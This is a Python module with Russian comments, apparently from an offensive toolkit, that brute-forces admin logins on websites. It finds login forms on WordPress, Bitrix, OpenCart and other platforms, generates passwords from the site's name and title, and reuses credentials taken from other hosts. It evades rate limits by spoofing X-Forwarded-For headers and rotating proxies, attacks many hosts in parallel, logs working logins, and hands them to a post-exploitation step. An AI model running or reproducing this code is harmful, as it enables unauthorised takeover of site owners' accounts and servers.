# -*- coding: utf-8 -*-
"""Перебор входа в админку. Движок не важен: форма разбирается со страницы.

run() возвращает:
  ("ok", логин, пароль) | ("captcha",) | ("limit",) | ("none",)
"""
import collections
import concurrent.futures as cf
import os
import random
import re
import time

from core import config, http, learn, ui, users, vault, verify, waf
from modules import post, profiles

CAP = 6            # попыток на хост по умолчанию
DEFAULTS = (("admin", "admin"), ("admin", "123456"), ("admin", "admin123"),
            ("admin", "password"), ("admin", "qwerty"), ("admin", "12345678"),
            ("admin", "admin1"), ("admin", "12345"))
PAUSE = 0.4        # пауза между попытками, сек

TRL = {"а": "a", "б": "b", "в": "v", "г": "g", "д": "d", "е": "e", "є": "e",
       "ж": "zh", "з": "z", "и": "i", "і": "i", "ї": "i", "й": "y", "к": "k",
       "л": "l", "м": "m", "н": "n", "о": "o", "п": "p", "р": "r", "с": "s",
       "т": "t", "у": "u", "ф": "f", "х": "h", "ц": "c", "ч": "ch", "ш": "sh",
       "щ": "sch", "ь": "", "ю": "yu", "я": "ya", "ы": "y", "э": "e", "ё": "e"}
LEET = {"a": "@", "o": "0", "e": "3", "i": "1", "s": "$"}
TAIL = ("", "1", "12", "123", "1234", "12345", "01", "007", "2024", "2025",
        "2026", "!", "@", "#", "_", "1!", "2026!")


def _trl(text):
    out = []
    for ch in text.lower():
        if ch in TRL:
            out.append(TRL[ch])
        elif ch.isalnum():
            out.append(ch)
    return "".join(out)


def _bases(host, title):
    label = host.split(".")[0]
    words = [label]
    if "-" in label:
        words += [w for w in label.split("-") if w]
    if title:
        for w in title.replace("—", " ").split()[:4]:
            w = "".join(c for c in w.lower() if c.isalnum() or c in " -")
            if len(w) > 2:
                words.append(w)
                t = _trl(w)
                if t and t != w:
                    words.append(t)
    out = []
    for w in words:
        w = w.strip()
        if not w:
            continue
        out += [w, w.capitalize(), w.upper()]
        if len(w) > 3:
            out.append(w[0].upper() + w[1:])
    out += ["admin", "Admin", "administrator", "qwerty", "password", "123456",
            "adminadmin", label + label]
    seen = []
    for x in out:
        if x and x not in seen:
            seen.append(x)
    return seen


def _words(host, title, cap=60):
    out = []
    for b in _bases(host, title):
        for t in TAIL:
            out.append(b + t)
    for b in _bases(host, title)[:12]:
        leet = "".join(LEET.get(c, c) for c in b)
        if leet != b:
            out.append(leet)
            out.append(leet + "1")
    seen = []
    for x in out:
        if x and x not in seen and 4 <= len(x) <= 30:
            seen.append(x)
    return seen[:cap]


def _users(host, kind=""):
    label = host.split(".")[0]
    out = users.get(host, kind) + ["admin", "administrator", label, "manager", "root", "info"]
    seen = []
    for x in out:
        if x and x not in seen:
            seen.append(x)
    return seen


CAPTCHA_HINTS = ("turnstile", "recaptcha", "hcaptcha", "captcha")


def _loginish(html):
    low = html.lower()
    return ("password" in low or "пароль" in low or "войти" in low
            or "login" in low or "sign in" in low)


def _links(host, sess, limit=20):
    """Ссылки-кандидаты на вход со страниц сайта."""
    seen, out = [], []
    for start in ("/", "/authorization/", "/login/", "/my-account/"):
        try:
            r = http.get(host, start, sess=sess)
        except Exception:
            continue
        for href in re.findall(r'href=["\']([^"\']+)["\']', r.text, re.I):
            if href.startswith(("mailto:", "tel:", "#", "javascript:")):
                continue
            if href.startswith("http"):
                if host not in href:
                    continue
                href = "/" + href.split("/", 3)[-1]
            if not href.startswith("/"):
                href = "/" + href
            low = href.lower()
            if not any(k in low for k in ("login", "auth", "account", "cabinet", "signin", "lk")):
                continue
            if href not in seen:
                seen.append(href)
                out.append(href)
        if len(out) >= limit:
            break
    return out[:limit]


WP_PATHS = ("/wp-login.php", "/wp-admin/")
COMMON = ("/login", "/login/", "/signin", "/sign-in", "/admin/", "/administrator/",
          "/manager/", "/panel/", "/cabinet/", "/lk/", "/account/", "/my-account/",
          "/bitrix/admin/", "/user/login", "/admin/login", "/auth/login",
          "/administrator/index.php", "/index.php?route=common/login")


def _has_pass(html):
    return bool(re.search(r'<input[^>]*type=[\"\']?password', html, re.I))


def _final(r):
    try:
        u = r.url or ""
        return "/" + (u.split("/", 3)[-1] or "")
    except Exception:
        return ""


def _discover(host, sess, prof):
    """Настоящая форма входа: редиректы с wp-login, robots, типовые пути."""
    out = []

    def add(p):
        p = (p or "").split("?")[0]
        if p.startswith("/") and p not in out:
            out.append(p)

    for p in (prof.get("admin") or []):
        add(p)

    for p in WP_PATHS:
        try:
            r = http.get(host, p, sess=sess, timeout=8, tries=1)
        except Exception:
            continue
        body = r.text or ""
        fin = _final(r)
        if fin and "wp-login" not in fin and fin != p and _has_pass(body):
            add(fin)
        elif p == "/wp-admin/" and _has_pass(body):
            add(p)

    try:
        r = http.get(host, "/robots.txt", sess=sess, timeout=6, tries=1)
        for line in (r.text or "").splitlines():
            low = line.lower()
            if ":" in line and any(k in low for k in ("login", "admin", "cabinet", "auth")):
                part = line.split(":", 1)[-1].strip().split(" ")[0]
                if part.startswith("/"):
                    add(part)
    except Exception:
        pass

    for p in COMMON:
        if len(out) >= 24:
            break
        if p in out:
            continue
        try:
            r = http.get(host, p, sess=sess, timeout=6, tries=1)
        except Exception:
            continue
        if r.status_code == 200 and _has_pass(r.text or ""):
            add(p)

    for p in _links(host, sess):
        add(p)
    return out[:24]


def _form(host, path, sess):
    """Разбирает форму входа: экшен, имена полей, скрытые токены, капча."""
    r = http.get(host, path, sess=sess, timeout=8, tries=1)
    if r.status_code in (301, 302, 303, 307):
        loc = r.headers.get("Location") or ""
        if loc:
            if loc.startswith("http"):
                loc = "/" + loc.split("/", 3)[-1]
            r = http.get(host, loc, sess=sess, timeout=8, tries=1)
            path = loc
    html = r.text
    if not _loginish(html) and not _has_pass(html):
        return None
    captcha = any(c in html.lower() for c in CAPTCHA_HINTS)

    action, user_f, pass_f, hidden = path, None, None, {}
    m = re.search(r"<form[^>]*>", html, re.I)
    if m:
        act = re.search(r'action=["\']([^"\']*)["\']', m.group(0), re.I)
        if act and act.group(1):
            action = act.group(1)
    if action.startswith("http"):
        action = "/" + action.split("/", 3)[-1]
    if not action.startswith("/"):
        base = path.rsplit("/", 1)[0]
        action = (base + "/" + action) if base else ("/" + action)
    if action == path:
        jm = re.search(r'(?:url|action)\s*[:=]\s*["\']([^"\']*(?:ajax|login|auth)[^"\']*)["\']', html, re.I)
        if jm:
            action = jm.group(1)
            if action.startswith("http"):
                action = "/" + action.split("/", 3)[-1]

    for fm in re.finditer(r"<input[^>]*>", html, re.I):
        t = fm.group(0)
        nm = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
        if not nm:
            continue
        name = nm.group(1)
        if "hidden" in t.lower():
            vl = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
            hidden[name] = vl.group(1) if vl else ""
            continue
        low = name.lower()
        if not pass_f and ("pass" in low or "pwd" in low):
            pass_f = name
        elif not user_f and (low in ("log", "login", "username", "user", "email",
                                     "loginname", "usr")
                             or "log" in low or "user" in low or "mail" in low):
            user_f = name
    if not pass_f:
        jm = re.search(r'name=["\']?(password|passwd|pwd)["\']?', html, re.I)
        if jm:
            pass_f = jm.group(1)
    if not user_f:
        jm = re.search(r'name=["\']?(login|username|email|log)["\']?', html, re.I)
        if jm:
            user_f = jm.group(1)
    if not pass_f or not user_f:
        return None
    return {"action": action, "user": user_f, "pass": pass_f,
            "hidden": hidden, "captcha": captcha}


def _post(host, form, user, pwd, sess):
    import urllib.parse
    parts = []
    for k, v in form["hidden"].items():
        parts.append("%s=%s" % (urllib.parse.quote(k), urllib.parse.quote(v)))
    parts.append("%s=%s" % (form["user"], urllib.parse.quote(user)))
    parts.append("%s=%s" % (form["pass"], urllib.parse.quote(pwd)))
    body = "&".join(parts)
    ref = "https://" + host + form["action"]
    return http.post(host, form["action"], body, referer=ref, sess=sess, timeout=8, tries=1)


def _ok(host, r, sess, kind):
    loc = (r.headers.get("Location") or "").lower()
    if kind == "opencart" and "user_token=" in loc:
        return True
    body = (r.text or "").lower()
    if kind == "frappe" and ('"logged in"' in body or '"home_page"' in body):
        return True
    if "reauth=1" in loc:
        return False
    if loc and "login" not in loc and "wp-login" not in loc:
        return verify.confirm(host, sess, kind)
    if "logout" in body and 'name="password"' not in body:
        return verify.confirm(host, sess, kind)
    return False


def _limited(r):
    if r.status_code in (429, 503):
        return True
    low = r.text.lower()
    return "too many" in low or "слишком много" in low or "заблокирован" in low


def run(host, title="", quiet=False, kind="", budget=CAP, pause=PAUSE, login=""):
    prof = profiles.get(kind) or {}
    guard = (waf.known(host) or {}).get("strategy")
    if guard == "wait":
        pause = max(pause, 2.0)
    elif guard == "browser":
        pause = max(pause, 1.0)
    sess = http.persist(host)
    form = None
    paths = [login] if login else _discover(host, sess, prof)
    for a in paths:
        try:
            probe = http.get(host, a, sess=sess, timeout=8, tries=1)
        except Exception:
            probe = None
        if probe is not None and (probe.status_code in (429, 503)
                                  or "service temporarily unavailable" in (probe.text or "").lower()):
            if not quiet:
                ui.warn("лимит на сайте (%d)" % probe.status_code)
            learn.error("brute", "limit")
            return ("limit",)
        try:
            form = _form(host, a, sess)
        except Exception:
            form = None
        if form:
            break
    if not form:
        if not quiet:
            ui.say("форма входа не найдена")
        return ("noform",)

    if form["captcha"]:
        if not quiet:
            ui.warn("капча на форме")
        return ("captcha",)

    words = learn.bonus(kind, _words(host, title))
    users = _users(host, kind)
    pairs = list(vault.pairs(kind, exclude=host, limit=10))
    for u, p in DEFAULTS:
        pairs.append((u, p))
    if kind == "bitrix":
        pairs.insert(0, ("bitrix", "bitrix"))
    if kind == "frappe":
        pairs.insert(0, ("Administrator", "admin"))
        pairs.insert(0, ("Administrator", "Administrator"))
    for p in words:
        for u in users[:2]:
            pairs.append((u, p))
    seen = []
    out = []
    for x in pairs:
        if x not in seen:
            seen.append(x)
            out.append(x)
    pairs = out[:budget]

    if not quiet:
        ui.say("форма: %s, пар: %d" % (form["action"], len(pairs)))

    for i, (user, pwd) in enumerate(pairs, 1):
        try:
            sess.headers["X-Forwarded-For"] = "%d.%d.%d.%d" % (
                random.randint(11, 223), random.randint(0, 255),
                random.randint(0, 255), random.randint(1, 254))
        except Exception:
            pass
        try:
            r = _post(host, form, user, pwd, sess)
        except Exception as e:
            if "timed out" in str(e).lower() or "timeout" in str(e).lower():
                if not quiet:
                    ui.warn("сайт отрезал (таймаут)")
                learn.error("brute", "blocked")
                return ("blocked",)
            time.sleep(1.5)
            continue
        if r.status_code == 403:
            time.sleep(2.5)
            try:
                r = _post(host, form, user, pwd, sess)
            except Exception:
                pass
        if _ok(host, r, sess, kind):
            if not quiet:
                ui.ok("ПОДОШЛО: %s / %s" % (user, pwd))
            learn.password_ok(kind, pwd)
            vault.add(host, kind, user, pwd)
            _append(OK_FILE, "%s|%s|%s:%s" % (host, kind, user, pwd))
            if not quiet:
                post.run(host, kind, "%s:%s" % (user, pwd))
            return ("ok", user, pwd)
        if _limited(r):
            if not quiet:
                ui.warn("лимит на сайте")
            learn.error("brute", "limit")
            return ("limit",)
        if i % 5 == 0 and not quiet:
            ui.say("проб: %d" % i)
        if pause:
            time.sleep(pause + random.random() * 0.4)
    if not quiet:
        ui.say("не подобрал")
    return ("none",)


OK_FILE = os.path.join(config.DATA, "brute_ok.txt")
PARK_FILE = os.path.join(config.DATA, "brute_parked.txt")


def _append(path, line):
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def run_batch(items, workers=8, budget=CAP):
    """items: [(host, kind, login)]. Лимит на сайте = смена прокси и вторая попытка."""
    stats = collections.Counter()

    def one(item):
        host, kind, login = item
        for attempt in range(2):
            res = run(host, "", quiet=True, kind=kind, budget=budget, login=login)
            state = res[0]
            if state == "ok":
                _append(OK_FILE, "%s|%s|%s|%s:%s" % (host, kind, login, res[1], res[2]))
                return host, "ok"
            if state == "limit" and attempt == 0:
                http.drop(host)
                time.sleep(1.5)
                continue
            if state in ("captcha", "limit", "blocked"):
                _append(PARK_FILE, "%s|%s|%s|%s" % (host, kind, state, login))
                return host, state
            return host, "none"
        return host, "limit"

    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for host, state in ex.map(one, items):
            stats[state] += 1
            if state == "ok":
                ui.ok("%s — ВХОД" % host)
    return stats


def resume(budget=CAP, workers=4):
    """Повтор отложенных: капча, лимит, блок."""
    if not os.path.isfile(PARK_FILE):
        return collections.Counter()
    items = []
    with open(PARK_FILE, encoding="utf-8") as f:
        for line in f:
            p = line.strip().split("|")
            if len(p) >= 4 and p[3]:
                items.append((p[0], p[1], p[3]))
    if not items:
        return collections.Counter()
    open(PARK_FILE, "w", encoding="utf-8").close()
    return run_batch(items, workers=workers, budget=budget)
